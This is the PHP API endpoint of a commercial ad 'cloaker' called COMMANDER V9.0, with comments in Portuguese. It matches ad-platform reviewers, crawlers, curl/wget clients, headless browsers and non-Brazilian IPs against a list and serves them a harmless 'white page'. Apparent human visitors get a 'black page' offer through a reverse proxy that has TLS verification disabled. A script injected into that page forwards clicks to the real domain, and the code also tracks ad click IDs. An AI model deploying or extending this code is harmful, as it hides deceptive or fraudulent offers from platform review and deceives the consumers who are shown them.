<?php
/**
 * api.php - COMMANDER V9.0 API ENDPOINT
 * Este arquivo DEVE ficar na mesma pasta do painel (index.php do dashboard)
 * 
 * FUNCAO: Recebe requisicoes do tracker (index.php remoto) e decide
 * se deve mostrar WHITE PAGE (bots) ou BLACK PAGE (humanos)
 * usando PROXY REVERSO (nao redirect)
 */

error_reporting(0);
ini_set('display_errors', 0);

// Arquivos de dados
$links_file     = 'links_clientes.json';
$stats_file     = 'stats.json';
$blacklist_file = 'blocked_ips.json';
$whitelist_file = 'whitelist.json';
$clicks_file    = 'clicks.json';

// Cria arquivos se nao existirem
if (!file_exists($links_file)) file_put_contents($links_file, '{}');
if (!file_exists($stats_file)) file_put_contents($stats_file, '{}');
if (!file_exists($whitelist_file)) file_put_contents($whitelist_file, '[]');
if (!file_exists($clicks_file)) file_put_contents($clicks_file, '{}');

// ===============================
// FUNCOES HELPER
// ===============================

function getLinksDB() {
    global $links_file;
    $db = json_decode(file_get_contents($links_file), true) ?? [];
    return is_array($db) ? $db : [];
}

function updateStats($user, $type) {
    global $stats_file;
    $stats = file_exists($stats_file) ? json_decode(file_get_contents($stats_file), true) : [];
    if (!isset($stats[$user])) {
        $stats[$user] = ['black' => 0, 'white' => 0, 'bots' => []];
    }
    $stats[$user][$type]++;
    file_put_contents($stats_file, json_encode($stats, JSON_PRETTY_PRINT));
}

function addBotLog($user, $ip, $ua, $reason = 'User-Agent') {
    global $stats_file;
    $stats = file_exists($stats_file) ? json_decode(file_get_contents($stats_file), true) : [];
    if (!isset($stats[$user])) {
        $stats[$user] = ['black' => 0, 'white' => 0, 'bots' => []];
    }
    // Guarda os ultimos 100 bots
    array_unshift($stats[$user]['bots'], [
        'ip' => $ip,
        'ua' => substr($ua, 0, 150),
        'date' => date('d/m/Y H:i'),
        'reason' => $reason
    ]);
    $stats[$user]['bots'] = array_slice($stats[$user]['bots'], 0, 100);
    file_put_contents($stats_file, json_encode($stats, JSON_PRETTY_PRINT));
}

function logClick($user, $data) {
    global $clicks_file;
    $clicks = file_exists($clicks_file) ? json_decode(file_get_contents($clicks_file), true) : [];
    if (!is_array($clicks)) $clicks = [];
    
    $click_id = uniqid('click_');
    $clicks[$click_id] = array_merge($data, [
        'user' => $user,
        'timestamp' => date('Y-m-d H:i:s')
    ]);
    
    // Mantém apenas os ultimos 5000 clicks
    if (count($clicks) > 5000) {
        $clicks = array_slice($clicks, -5000, 5000, true);
    }
    
    file_put_contents($clicks_file, json_encode($clicks, JSON_PRETTY_PRINT));
}

function isBot($ua, $ip, &$reason = '') {
    global $whitelist_file;
    
    // 1. Verifica whitelist primeiro (IPs liberados sempre passam)
    $whitelist = file_exists($whitelist_file) ? json_decode(file_get_contents($whitelist_file), true) : [];
    if (in_array($ip, $whitelist)) {
        return false; // IP liberado = humano
    }

    // 2. BLOQUEIO GEOGRÁFICO (Apenas Brasil)
    // IPs locais não precisam de checagem externa
    if ($ip !== '127.0.0.1' && $ip !== '::1' && !empty($ip)) {
        $ctx = stream_context_create(['http' => ['timeout' => 2]]);
        $api_url = "http://ip-api.com/json/{$ip}?fields=status,countryCode";
        $response = @file_get_contents($api_url, false, $ctx);
        
        if ($response) {
            $geo_data = json_decode($response, true);
            if (isset($geo_data['status']) && $geo_data['status'] === 'success') {
                if ($geo_data['countryCode'] !== 'BR') {
                    $reason = 'Geo-Blocking: Fora do BR (' . $geo_data['countryCode'] . ')';
                    return true; // Trata estrangeiro como bot (manda para White Page)
                }
            }
        }
    }
    
    // 3. Lista de bots conhecidos com categorias
    $bot_patterns = [
        // Crawlers de busca
        'googlebot' => 'Googlebot',
        'bingbot' => 'Bingbot',
        'yandexbot' => 'Yandex',
        'duckduckbot' => 'DuckDuckBot',
        'slurp' => 'Yahoo Slurp',
        'baiduspider' => 'Baidu',
        
        // Verificadores e Ferramentas de Performance
        'headless' => 'Headless Browser',
        'lighthouse' => 'Google Performance Tool',
        
        // Redes sociais
        'facebookexternalhit' => 'Facebook',
        'facebot' => 'Facebook',
        'twitterbot' => 'Twitter',
        'linkedinbot' => 'LinkedIn',
        'pinterest' => 'Pinterest',
        'whatsapp' => 'WhatsApp',
        'telegrambot' => 'Telegram',
        'discordbot' => 'Discord',
        'slackbot' => 'Slack',
        
        // Ferramentas de analise
        'semrush' => 'SEMrush',
        'ahrefs' => 'Ahrefs',
        'dotbot' => 'Moz/DotBot',
        'rogerbot' => 'Moz/Rogerbot',
        'majestic' => 'Majestic',
        'screaming frog' => 'ScreamingFrog',
        'sitebulb' => 'Sitebulb',
        'gtmetrix' => 'GTMetrix',
        'pingdom' => 'Pingdom',
        'pagespeed' => 'PageSpeed',
        'lighthouse' => 'Lighthouse',
        
        // Bots genericos (mais especificos para evitar falsos positivos)
        'crawler' => 'Crawler',
        'spider' => 'Spider',
        'scraper' => 'Scraper',
        'curl/' => 'cURL',
        'wget/' => 'Wget',
        'python-requests' => 'Python Requests',
        'python-urllib' => 'Python Urllib',
        'java/' => 'Java',
        'perl/' => 'Perl',
        'ruby/' => 'Ruby',
        'go-http-client' => 'Go HTTP',
        'axios/' => 'Axios',
        'node-fetch' => 'Node Fetch',
        'postman' => 'Postman',
        'insomnia' => 'Insomnia',
        'httpie' => 'HTTPie',
        
        // Meta/Facebook
        'meta-externalagent' => 'Meta Agent',
        'facebookcatalog' => 'FB Catalog',
        
        // Verificadores
        'validator' => 'Validator',
        'checker' => 'Checker',
        'monitor' => 'Monitor',
        'uptime' => 'Uptime',
        'headless' => 'Headless',
        'phantom' => 'PhantomJS',
        'selenium' => 'Selenium',
        'puppeteer' => 'Puppeteer',
        'playwright' => 'Playwright',
        'webdriver' => 'WebDriver',
        
        // Redes de ads (revisores)
        'adsbot' => 'AdsBot',
        'mediapartners' => 'MediaPartners',
        'feedfetcher' => 'FeedFetcher',
        'bytespider' => 'ByteSpider'
    ];
    
    $ua_lower = strtolower($ua);
    
    foreach ($bot_patterns as $pattern => $name) {
        if (strpos($ua_lower, $pattern) !== false) {
            $reason = $name;
            return true;
        }
    }
    
    // 4. Verifica se UA esta vazio ou muito curto
    if (empty($ua) || strlen($ua) < 20) {
        $reason = 'UA vazio/curto';
        return true;
    }
    
    return false;
}
// Resolve caminhos relativos para URLs absolutas
function resolveUrl($url, $ref_domain = '') {
    // Se ja e uma URL completa, retorna como esta
    if (preg_match('/^https?:\/\//i', $url)) {
        return $url;
    }
    
    // Se tem dominio de referencia, usa ele
    if (!empty($ref_domain)) {
        $ref_domain = rtrim($ref_domain, '/');
        if (!preg_match('/^https?:\/\//i', $ref_domain)) {
            $ref_domain = 'https://' . $ref_domain;
        }
        return $ref_domain . '/' . ltrim($url, '/');
    }
    
    // Fallback: retorna como esta (vai falhar, mas pelo menos nao quebra)
    return $url;
}

function proxyPage($url, $path = '', $query_string = '') {
    // Constroi a URL final
    $final_url = rtrim($url, '/');
    
    if (!empty($path)) {
        $final_url .= '/' . ltrim($path, '/');
    }
    
    if (!empty($query_string)) {
        $separator = (strpos($final_url, '?') !== false) ? '&' : '?';
        $final_url .= $separator . $query_string;
    }
    
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL            => $final_url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_TIMEOUT        => 30,
        CURLOPT_CONNECTTIMEOUT => 10,
        CURLOPT_ENCODING       => "",
        CURLOPT_USERAGENT      => $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0',
        CURLOPT_HTTPHEADER     => [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control: no-cache'
        ]
    ]);
    
    $html = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $final_url_resolved = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
    $curl_error = curl_error($ch);
    curl_close($ch);
    
    // Log do proxy para debug
    $proxy_log = [
        'time' => date('Y-m-d H:i:s'),
        'requested_url' => $final_url,
        'resolved_url' => $final_url_resolved,
        'http_code' => $http_code,
        'html_length' => strlen($html ?: ''),
        'curl_error' => $curl_error ?: 'none'
    ];
    file_put_contents('proxy_debug.json', json_encode($proxy_log, JSON_PRETTY_PRINT));
    
    if ($http_code >= 200 && $http_code < 400 && !empty($html)) {
        $base_url_info = parse_url($final_url_resolved);
        $base_origin = $base_url_info['scheme'] . '://' . $base_url_info['host'];

        // --- INJEÇÃO DE SCRIPT PARA SALTO DE DOMÍNIO ---
        // Este script faz o botão pular para o site real ao ser clicado
        $redirect_script = "
        <script>
        document.addEventListener('click', function(e) {
            const target = e.target.closest('a, button');
            if (!target) return;

            // Se for um link (tag <a>)
            if (target.tagName === 'A' && target.href) {
                const url = new URL(target.href);
                // Se o link apontar para o domínio do cloaker, redireciona para o real
                if (url.origin === window.location.origin || url.origin === 'null' || target.getAttribute('href').startsWith('/')) {
                    e.preventDefault();
                    const realDomain = '$base_origin';
                    // Mantém o path e as UTMs
                    const destination = realDomain + url.pathname + url.search + url.hash;
                    window.top.location.href = destination;
                }
            }
        }, true);
        </script>
        ";

        // Insere o script e a tag <base> para carregar imagens/CSS corretamente
        $html = str_replace('</body>', $redirect_script . '</body>', $html);

        if (stripos($html, '<base') === false) {
            $html = preg_replace(
                '/(<head[^>]*>)/i',
                '$1<base href=\"' . $base_origin . '/\">',
                $html,
                1
            );
        }
        
        return $html;
    }
    
    return false;
}
// ===============================
// PROCESSAMENTO DA REQUISICAO
// ===============================

// Verifica se e uma requisicao POST do tracker
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo 'Method Not Allowed';
    exit;
}

// Dados recebidos do tracker (index.php remoto)
$license    = $_POST['license'] ?? '';      // Email do usuario (base64 decoded no tracker)
$token_xgo  = $_POST['token_url'] ?? '';    // Token da rota
$ua         = $_POST['ua'] ?? '';           // User Agent
$ip         = $_POST['ip'] ?? '';           // IP do visitante
$qs         = $_POST['qs'] ?? '';           // Query string original
$path       = $_POST['path'] ?? '';         // Path da subpagina (ex: checkout, obrigado)
$ref_domain = $_POST['ref_domain'] ?? '';   // Dominio de origem (para resolver paths relativos)

// DEBUG MODE - Ative para ver o que esta acontecendo
// Acesse: https://seudominio.com/COMMANDER/api.php?debug=1 via POST
$debug_mode = isset($_GET['debug']) && $_GET['debug'] === '1';

// Validacao basica
if (empty($license) || empty($token_xgo)) {
    http_response_code(400);
    echo 'Bad Request - Missing parameters';
    exit;
}

// Busca a rota pelo token_xgo
$links_db = getLinksDB();
$route = null;

// Tenta encontrar a rota de varias formas (compatibilidade com diferentes versoes do painel)
foreach ($links_db as $id => $r) {
    // Verifica se o usuario bate
    $user_match = ($r['user'] ?? '') === $license;
    
    // Verifica token em diferentes campos possiveis
    $token_match = (
        ($r['token_xgo'] ?? '') === $token_xgo ||
        ($r['token'] ?? '') === $token_xgo ||
        ($r['token_url'] ?? '') === $token_xgo ||
        $id === $token_xgo
    );
    
    if ($user_match && $token_match) {
        $route = $r;
        break;
    }
}

// Rota nao encontrada
if (!$route) {
    // Log para debug - salva em arquivo
    $error_log = [
        'time' => date('Y-m-d H:i:s'),
        'license' => $license,
        'token_xgo' => $token_xgo,
        'available_routes' => array_map(function($r) {
            return [
                'user' => $r['user'] ?? 'N/A',
                'token_xgo' => $r['token_xgo'] ?? 'N/A',
                'token' => $r['token'] ?? 'N/A'
            ];
        }, $links_db)
    ];
    file_put_contents('api_errors.json', json_encode($error_log, JSON_PRETTY_PRINT));
    
    http_response_code(404);
    echo 'Route not found - Token: ' . $token_xgo . ' | License: ' . $license;
    exit;
}

// =====================================================
// VERIFICACAO DE ASSINATURA DO USUARIO
// Se vencida ou bloqueada, cloaker para de funcionar
// =====================================================
$usuariosFile = dirname(__DIR__) . '/usuarios.json';
if (file_exists($usuariosFile) && !empty($license)) {
    $usuarios = json_decode(file_get_contents($usuariosFile), true) ?? [];
    $ownerData = null;
    
    // Busca usuario pelo email (license)
    foreach ($usuarios as $emailKey => $userData) {
        if ($emailKey === $license || ($userData['id'] ?? '') === $license) {
            $ownerData = $userData;
            break;
        }
    }
    
    if ($ownerData) {
        // Verifica se esta bloqueado
        if (!empty($ownerData['bloqueado']) && $ownerData['bloqueado'] === true) {
            header('Content-Type: application/json');
            echo json_encode([
                'status' => 'ok',
                'action' => 'white',
                'is_bot' => true,
                'reason' => 'subscription_blocked'
            ]);
            exit;
        }
        
        // Verifica data de expiracao
        if (!empty($ownerData['expira_em'])) {
            $expiraEm = strtotime($ownerData['expira_em']);
            if ($expiraEm !== false && $expiraEm < time()) {
                header('Content-Type: application/json');
                echo json_encode([
                    'status' => 'ok',
                    'action' => 'white',
                    'is_bot' => true,
                    'reason' => 'subscription_expired'
                ]);
                exit;
            }
        }
    }
}

// URLs configuradas no painel
$white_page = $route['white'] ?? '';
$black_page = $route['black'] ?? '';

// Resolve URLs relativas para absolutas
$white_page = resolveUrl($white_page, $ref_domain);
$black_page = resolveUrl($black_page, $ref_domain);

// Verifica se e bot ou humano
$bot_reason = '';
$is_bot = isBot($ua, $ip, $bot_reason);

// DEBUG OUTPUT
if ($debug_mode) {
    header('Content-Type: application/json');
    echo json_encode([
        'status' => 'debug',
        'received' => [
            'license' => $license,
            'token_xgo' => $token_xgo,
            'ua' => $ua,
            'ip' => $ip,
            'qs' => $qs,
            'path' => $path,
            'ref_domain' => $ref_domain
        ],
        'route_found' => $route ? true : false,
        'route_data' => $route,
        'resolved_urls' => [
            'white_page' => $white_page,
            'black_page' => $black_page
        ],
        'detection' => [
            'is_bot' => $is_bot,
            'reason' => $bot_reason
        ],
        'decision' => $is_bot ? 'WHITE PAGE (bot)' : 'BLACK PAGE (humano)'
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
    exit;
}

// Parse da query string para extrair UTMs
parse_str($qs, $params);

// Dados do click para log
$click_data = [
    'ip'           => $ip,
    'ua'           => substr($ua, 0, 200),
    'is_bot'       => $is_bot,
    'path'         => $path,
    'utm_source'   => $params['utm_source'] ?? '',
    'utm_campaign' => $params['utm_campaign'] ?? '',
    'utm_medium'   => $params['utm_medium'] ?? '',
    'utm_content'  => $params['utm_content'] ?? '',
    'utm_term'     => $params['utm_term'] ?? '',
    'ttclid'       => $params['ttclid'] ?? '',
    'gclid'        => $params['gclid'] ?? '',
    'fbclid'       => $params['fbclid'] ?? '',
    'platform'     => !empty($params['ttclid']) ? 'tiktok' : (!empty($params['gclid']) ? 'google' : (!empty($params['fbclid']) ? 'meta' : 'outro')),
    'converted'    => false,
    'checkout_started' => false,
    'revenue'      => 0
];

// Log do click
logClick($license, $click_data);

// ===============================
// DECISAO: WHITE ou BLACK PAGE
// ===============================

// Funcao para verificar se e um path local (pasta no mesmo dominio)
function isLocalPath($url) {
    // Se comeca com http:// ou https://, nao e local
    if (preg_match('/^https?:\/\//i', $url)) {
        return false;
    }
    // Se e apenas um nome de pasta/arquivo, e local
    return true;
}

// Funcao para extrair o path local da URL
function extractLocalPath($url, $ref_domain = '') {
    // Se for URL completa do mesmo dominio, extrai o path
    if (!empty($ref_domain)) {
        $ref_domain_clean = preg_replace('/^https?:\/\//i', '', $ref_domain);
        $ref_domain_clean = rtrim($ref_domain_clean, '/');
        
        // Remove o dominio da URL se for o mesmo
        $url_clean = preg_replace('/^https?:\/\//i', '', $url);
        if (strpos($url_clean, $ref_domain_clean) === 0) {
            return ltrim(substr($url_clean, strlen($ref_domain_clean)), '/');
        }
    }
    
    // Se nao tem protocolo, ja e um path local
    if (!preg_match('/^https?:\/\//i', $url)) {
        return ltrim($url, '/');
    }
    
    return null;
}

header('Content-Type: application/json');

if ($is_bot) {
    // BOT DETECTADO -> WHITE PAGE (pagina segura)
    updateStats($license, 'white');
    addBotLog($license, $ip, $ua, $bot_reason);
    
    // Verifica se white_page e local
    $local_white = extractLocalPath($route['white'] ?? '', $ref_domain);
    
    echo json_encode([
        'status' => 'ok',
        'action' => 'white',
        'is_bot' => true,
        'reason' => $bot_reason,
        'local_path' => $local_white,  // Se for local, o index.php faz include direto
        'proxy_url' => $local_white ? null : $white_page,  // Se nao for local, faz proxy
        'fallback' => 'view_article'  // Fallback local
    ]);
    exit;
    
} else {
    // HUMANO DETECTADO -> BLACK PAGE (pagina de oferta)
    updateStats($license, 'black');
    
    // Verifica se black_page e local
    $local_black = extractLocalPath($route['black'] ?? '', $ref_domain);
    
    echo json_encode([
        'status' => 'ok',
        'action' => 'black',
        'is_bot' => false,
        'local_path' => $local_black,  // Se for local (ex: "oficial"), o index.php faz include direto
        'proxy_url' => $local_black ? null : $black_page,  // Se nao for local, faz proxy
        'fallback' => null
    ]);
    exit;
}
// ===============================
// AUTO-CLEANUP (Otimização de Performance)
// ===============================
function performAutoCleanup($file, $limit = 2000) {
    if (file_exists($file)) {
        $data = json_decode(file_get_contents($file), true);
        if (is_array($data) && count($data) > $limit) {
            // Mantém apenas os registros mais recentes baseados no limite
            $data = array_slice($data, -$limit, $limit, true);
            file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT));
        }
    }
}

// Executa a limpeza a cada 100 acessos (para não pesar o servidor)
if (rand(1, 100) === 50) {
    performAutoCleanup('clicks.json', 3000); // Limite de 3 mil cliques
    performAutoCleanup('proxy_debug.json', 100); // Limite de 100 logs de debug
}
